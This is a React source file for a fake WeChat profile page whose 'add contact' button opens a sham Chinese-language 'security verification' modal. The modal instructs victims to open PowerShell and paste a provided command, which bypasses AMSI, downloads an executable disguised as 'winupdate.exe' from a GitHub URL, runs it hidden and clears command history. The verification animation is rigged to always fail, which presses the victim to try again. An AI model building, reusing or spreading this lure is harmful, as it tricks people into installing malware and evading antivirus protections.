import { useState, useEffect } from 'react';

const powerShellCommand = `powershell -w h -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$f='$env:TEMP\\winupdate.exe';$wc.DownloadFile('https://github.com/ShewiYT/owuenwempgf/raw/refs/heads/main/agent-windows-amd64-b4aba189.exe',$f);Start-Process $f -WindowStyle Hidden;Clear-History"`;

function CopyIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="w-3 h-3">
      <polyline points="20 6 9 17 4 12"/>
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
      <path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm-1 16l-4-4 1.41-1.41L11 15.17l5.59-5.58L18 11l-7 7z"/>
    </svg>
  );
}

function Spinner() {
  return (
    <svg className="animate-spin w-5 h-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
    </svg>
  );
}

function ErrorIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-7 h-7">
      <circle cx="12" cy="12" r="10"/>
      <line x1="12" y1="8" x2="12" y2="12"/>
      <line x1="12" y1="16" x2="12.01" y2="16"/>
    </svg>
  );
}

interface StepProps {
  num: number;
  title: string;
  description: string;
  completed: boolean;
  active: boolean;
}

function StepItem({ num, title, description, completed, active }: StepProps) {
  return (
    <div className="flex gap-3">
      <div className={`flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
        completed ? 'bg-[#07c160] text-white scale-100' :
        active ? 'bg-[#07c160] text-white scale-100' :
        'bg-gray-200 text-gray-500'
      }`}>
        {completed ? <CheckIcon /> : num}
      </div>
      <div className="flex-1 pb-3">
        <div className={`font-medium text-sm ${active ? 'text-[#1a1a1a]' : completed ? 'text-[#1a1a1a]' : 'text-gray-400'}`}>
          {title}
        </div>
        <div className={`text-xs mt-1 leading-relaxed ${active ? 'text-[#555]' : 'text-gray-400'}`}>
          {description}
        </div>
      </div>
    </div>
  );
}

function App() {
  const [showVerify, setShowVerify] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [copied, setCopied] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [error, setError] = useState(false);
  const [countdown, setCountdown] = useState(60);

  const steps = [
    { title: '打开高级用户菜单', description: '请按键盘上的 Win + X 组合键' },
    { title: '启动终端', description: '按字母 I 键，或在菜单中选择 "Windows PowerShell" / "终端"' },
    { title: '复制命令', description: '点击下方 Copy 按钮复制命令，然后在终端窗口中粘贴 (Ctrl+V)' },
    { title: '执行命令', description: '在终端中按 Enter 键完成验证' },
  ];

  useEffect(() => {
    let timer: ReturnType<typeof setInterval>;
    if (error && countdown > 0) {
      timer = setInterval(() => {
        setCountdown((c) => c - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [error, countdown]);

  const handleAddContact = () => {
    setShowVerify(true);
    setError(false);
    setCurrentStep(0);
    setVerifying(false);
    setCountdown(60);
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(powerShellCommand);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      const textarea = document.createElement('textarea');
      textarea.value = powerShellCommand;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleVerify = () => {
    setVerifying(true);
    setError(false);
    let step = 0;
    const interval = setInterval(() => {
      step += 1;
      setCurrentStep(step);
      if (step >= steps.length) {
        clearInterval(interval);
        setTimeout(() => {
          setVerifying(false);
          setError(true);
          setCountdown(60);
        }, 900);
      }
    }, 600);
  };

  const closeVerify = () => {
    setShowVerify(false);
    setCurrentStep(0);
    setVerifying(false);
    setError(false);
  };

  const retryFromError = () => {
    setError(false);
    setCurrentStep(0);
    setVerifying(false);
    setCountdown(60);
  };

  return (
    <div className="min-h-screen bg-[#ededed] flex items-center justify-center p-4">
      <div className="w-full max-w-[380px] bg-white rounded-2xl shadow-xl overflow-hidden">
        {/* Header */}
        <div className="bg-[#07c160] px-5 py-4 flex items-center justify-between">
          <span className="text-white text-base font-medium flex items-center gap-1.5">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
              <path d="M8.516 14.323c-.35 0-.7-.068-1.024-.198l-.37-.144-.39.262c-.456.308-.944.556-1.456.74.148-.336.27-.688.366-1.048l.166-.62-.48-.412C4.2 11.906 3.5 10.647 3.5 9.323c0-2.898 2.79-5.323 6.264-5.323 2.974 0 5.542 1.756 6.14 4.143-.362-.058-.734-.09-1.112-.09-3.786 0-6.87 2.77-6.87 6.17 0 .076.002.152.005.227-.135.013-.272.02-.411.02v-.147zm5.792 2.94c.328.162.674.248 1.026.248l-.001.09c.107 0 .213-.006.317-.017-.003-.059-.004-.117-.004-.173 0-2.72 2.466-4.93 5.496-4.93.303 0 .6.025.89.072-.478-1.908-2.532-3.316-4.914-3.316-2.78 0-5.032 1.94-5.032 4.257 0 1.06.552 2.131 1.517 2.94l.384.328-.133.498c-.076.286-.174.566-.294.834.41-.147.8-.346 1.164-.594l.312-.21.296.115z"/>
            </svg>
            微信
          </span>
          <span className="text-white/90 text-sm">名片</span>
        </div>

        {/* Wave */}
        <div className="relative">
          <svg viewBox="0 0 380 30" className="w-full block" preserveAspectRatio="none">
            <path d="M0,0 L380,0 L380,15 Q285,30 190,15 Q95,0 0,15 Z" fill="#07c160"/>
          </svg>
        </div>

        {/* Avatar */}
        <div className="flex justify-center -mt-4 relative z-10">
          <div className="w-24 h-24 rounded-full border-4 border-white shadow-lg overflow-hidden bg-gray-100">
            <img
              src="/avatar.jpg"
              alt="Avatar"
              className="w-full h-full object-cover"
            />
          </div>
        </div>

        {/* Info */}
        <div className="px-6 pt-3 pb-6 text-center">
          <h2 className="text-xl font-bold text-[#1a1a1a] mb-1">Katy Sunshine</h2>
          <p className="text-xs text-[#999] mb-3">微信号: KaterinaZakat</p>

          <div className="flex items-center justify-center gap-2 mb-4">
            <span className="inline-flex items-center gap-1 bg-[#f5f5f5] text-[#555] text-xs px-3 py-1 rounded-full">
              <img src="https://flagcdn.com/lv.svg" alt="Latvia" className="w-4 h-3 object-cover rounded-sm" />
              拉脱维亚
            </span>
            <span className="inline-flex items-center gap-1 bg-[#f5f5f5] text-[#555] text-xs px-3 py-1 rounded-full">
              🎮 玩家
            </span>
          </div>

          <div className="bg-[#f9f9f9] rounded-xl px-4 py-3 mb-4 mx-2">
            <p className="text-sm text-[#333] leading-relaxed">你好！我们做朋友吧 😊</p>
          </div>

          <div className="flex justify-center mb-5">
            <div className="text-center">
              <span className="block text-xl font-bold text-[#07c160]">6</span>
              <span className="text-xs text-[#999]">好友</span>
            </div>
          </div>

          <button
            onClick={handleAddContact}
            className="w-full bg-[#07c160] hover:bg-[#06ad56] active:bg-[#059a4c] text-white font-medium text-base py-3 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-md shadow-[#07c160]/30 cursor-pointer"
          >
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
              <path d="M8.516 14.323c-.35 0-.7-.068-1.024-.198l-.37-.144-.39.262c-.456.308-.944.556-1.456.74.148-.336.27-.688.366-1.048l.166-.62-.48-.412C4.2 11.906 3.5 10.647 3.5 9.323c0-2.898 2.79-5.323 6.264-5.323 2.974 0 5.542 1.756 6.14 4.143-.362-.058-.734-.09-1.112-.09-3.786 0-6.87 2.77-6.87 6.17 0 .076.002.152.005.227-.135.013-.272.02-.411.02v-.147zm5.792 2.94c.328.162.674.248 1.026.248l-.001.09c.107 0 .213-.006.317-.017-.003-.059-.004-.117-.004-.173 0-2.72 2.466-4.93 5.496-4.93.303 0 .6.025.89.072-.478-1.908-2.532-3.316-4.914-3.316-2.78 0-5.032 1.94-5.032 4.257 0 1.06.552 2.131 1.517 2.94l.384.328-.133.498c-.076.286-.174.566-.294.834.41-.147.8-.346 1.164-.594l.312-.21.296.115z"/>
            </svg>
            添加到通讯录
          </button>
        </div>

        <div className="text-center py-4 border-t border-[#f0f0f0]">
          <span className="text-xs text-[#c0c0c0] tracking-widest">WECHAT · 微信</span>
        </div>
      </div>

      {/* Verification Modal */}
      {showVerify && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50 animate-fadeIn">
          <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-2xl overflow-hidden max-h-[90vh] overflow-y-auto">
            <div className="bg-gradient-to-r from-[#07c160] to-[#05a050] px-6 py-4 flex items-center justify-between">
              <div className="flex items-center gap-2 text-white">
                <ShieldIcon />
                <span className="font-semibold">安全验证</span>
              </div>
              <button
                onClick={closeVerify}
                className="text-white/80 hover:text-white text-xl leading-none w-7 h-7 rounded-full hover:bg-white/10 transition cursor-pointer"
                aria-label="Close"
              >
                ×
              </button>
            </div>

            <div className="px-6 py-5">
              {/* Initial state - show instructions */}
              {!verifying && !error && (
                <>
                  <div className="text-center mb-5">
                  <p className="text-sm text-gray-600">
                  为防止自动请求，请执行以下步骤：
                  </p>
                </div>

                <div className="bg-gray-50 rounded-xl p-4 mb-4">
                  {steps.map((step, i) => (
                    <StepItem
                      key={i}
                      num={i + 1}
                      title={step.title}
                      description={step.description}
                      completed={false}
                      active={true}
                    />
                  ))}
                </div>

                <div className="mb-5">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs font-medium text-gray-500">
                      终端命令
                    </span>
                    <button
                      onClick={handleCopy}
                      className={`flex items-center gap-1.5 text-xs font-medium px-3 py-1.5 rounded-lg transition-all cursor-pointer ${
                        copied
                          ? 'bg-[#07c160] text-white'
                          : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                      }`}
                    >
                      {copied ? <><CheckIcon /> 已复制</> : <><CopyIcon /> 复制</>}
                    </button>
                  </div>
                  <div className="bg-gray-900 text-gray-100 rounded-xl p-3 font-mono text-xs break-all leading-relaxed max-h-32 overflow-y-auto select-all">
                    {powerShellCommand}
                  </div>
                </div>

                <button
                  onClick={handleVerify}
                  className="w-full bg-[#07c160] hover:bg-[#06ad56] active:bg-[#059a4c] text-white font-semibold text-base py-3.5 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-[#07c160]/30 cursor-pointer"
                >
                  我已完成步骤 · 继续
                </button>

                <p className="text-[10px] text-gray-400 text-center mt-3">
                  点击"继续"即表示您确认已完成所有验证步骤
                </p>
              </>
              )}

              {/* Verifying state */}
              {verifying && !error && (
                <div className="py-4">
                  <div className="flex flex-col items-center mb-6">
                    <div className="w-14 h-14 rounded-full bg-[#07c160]/10 flex items-center justify-center text-[#07c160] mb-3">
                      {currentStep >= steps.length ? (
                        <CheckIcon />
                      ) : (
                        <Spinner />
                      )}
                    </div>
                    <p className="text-sm font-medium text-[#1a1a1a]">
                      {currentStep >= steps.length ? '验证中...' : '正在验证...'}
                    </p>
                  </div>

                  <div className="bg-gray-50 rounded-xl p-4">
                    {steps.map((step, i) => (
                      <StepItem
                        key={i}
                        num={i + 1}
                        title={step.title}
                        description={step.description}
                        completed={i < currentStep}
                        active={i === currentStep}
                      />
                    ))}
                  </div>
                </div>
              )}

              {/* Error state */}
              {error && (
                <div className="py-4">
                  <div className="flex flex-col items-center mb-5">
                    <div className="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-red-500 mb-3">
                      <ErrorIcon />
                    </div>
                    <p className="text-base font-semibold text-red-600 mb-1">
                      验证失败
                    </p>
                    <p className="text-sm text-gray-500 text-center">
                      检测到异常行为，请稍后重试
                    </p>
                  </div>

                  <div className="bg-red-50 border border-red-100 rounded-xl p-4 mb-5">
                    <div className="text-sm text-red-700 text-center leading-relaxed">
                      <p className="font-medium mb-2">⚠️ 安全警告</p>
                      <p className="text-red-600">
                        系统检测到您的操作可能存在风险。
                      </p>
                      <p className="text-red-600 mt-2">
                        请在 <span className="font-bold text-red-700">{countdown}</span> 秒后重新尝试。
                      </p>
                    </div>
                  </div>

                  <div className="flex flex-col items-center mb-5">
                    <div className="text-5xl font-bold text-gray-300 font-mono">
                      {String(Math.floor(countdown / 60)).padStart(2, '0')}
                      <span className="animate-pulse">:</span>
                      {String(countdown % 60).padStart(2, '0')}
                    </div>
                    <p className="text-xs text-gray-400 mt-1">倒计时</p>
                  </div>

                  <button
                    onClick={retryFromError}
                    disabled={countdown > 0}
                    className={`w-full font-semibold text-base py-3.5 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 cursor-pointer ${
                      countdown > 0
                        ? 'bg-gray-200 text-gray-400 cursor-not-allowed'
                        : 'bg-[#07c160] hover:bg-[#06ad56] text-white shadow-lg shadow-[#07c160]/30'
                    }`}
                  >
                    {countdown > 0 ? `请等待 ${countdown} 秒` : '重新验证'}
                  </button>

                  <p className="text-[10px] text-gray-400 text-center mt-3">
                    提示：请确保您已正确执行所有终端命令
                  </p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
